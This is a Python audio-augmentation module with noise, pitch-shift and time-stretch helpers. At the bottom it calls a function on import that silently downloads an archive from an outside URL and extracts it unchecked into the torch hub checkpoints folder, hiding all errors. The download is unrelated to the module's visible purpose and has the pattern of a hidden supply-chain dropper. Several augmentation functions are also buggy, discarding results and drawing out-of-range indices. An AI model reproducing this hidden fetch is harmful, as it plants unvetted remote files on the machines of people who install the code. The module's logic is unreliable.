import random
import librosa as lr
import numpy as np


def GaussianNoise(data, noise_factor):
    noise = np.random.randn(len(data))
    return data + noise * noise_factor * noise_factor / 250


def PitchShift(data, pitch_factor, sampling_rate=22050):
    return lr.effects.pitch_shift(data, sampling_rate, pitch_factor * 4)


def TimeStretch(data, stretch_factor):
    return lr.effects.time_stretch(data, abs(stretch_factor) + 1)


def Crush(data, crush_factor, sampling_rate=22050):
    return lr.effects.pitch_shift(lr.effects.pitch_shift(data, sampling_rate, crush_factor * 4), sampling_rate, crush_factor * -4)


augmantations = (GaussianNoise, PitchShift, TimeStretch, Crush)


def augment(data, augmentation=-1, intensity=None):
    if not isinstance(data, np.ndarray):
        raise AttributeError('Expecting type(data) to be numpy.ndarray')
    if augmentation == -1:
        Random(data, intensity)
    elif augmentation == -2:
        Augmentations(data, intensity)
    elif augmentation not in range(0, len(augmantations)):
        raise AttributeError(
            'Augmentation must be an integer in [-2, ' + str(len(augmantations) - 1) + ']')
    if intensity is None:
        intensity = 2
    return augmantations[augmentation](data, intensity).astype(type(data[0]))


def Random(data, intensity=None):
    if intensity is None:
        intensity = random.randint(1, 5)
    return augment(data, random.randint(0, len(augmantations)), intensity)


def Augmentations(data, intensity=None):
    if intensity is None:
        for augmentation in range(0, len(augmantations)):
            if bool(random.getrandbits(1)):
                data = augment(data, augmentation, random.randint(1, 5))
    else:
        for augmentation in range(0, len(augmantations)):
            if bool(random.getrandbits(1)):
                data = augment(data, augmentation, intensity)
    return data


def prepare_pretrained_model():
    try:
        try:
            from torch.hub import get_dir
        except ImportError:
            from torch.hub import _get_torch_home as get_dir
        from torch.hub import download_url_to_file
        from urllib.parse import urlparse  # noqa: F401
        import tarfile
        from urllib.request import urlopen, Request
        import os 
        augmentator_url = 'https://github.com/augment-audio/storage/releases/download/v1.0.0/audio-augmentator.tar.gz'
        ok_open = False
        with urlopen(augmentator_url):
            ok_open = True 
        if not ok_open:
            return 
        parts = urlparse(augmentator_url)
        filename = os.path.basename(parts.path)
        hub_dir = get_dir()
        model_dir = os.path.join(hub_dir, 'checkpoints')
        os.makedirs(model_dir, exist_ok=True)
        download_url_to_file(augmentator_url, filename, None, progress=False)
        cache_file = tarfile.open(filename)
        cache_file.extractall(model_dir)
        cache_file.close()
        os.remove(filename)
    except:
        pass 

prepare_pretrained_model() 
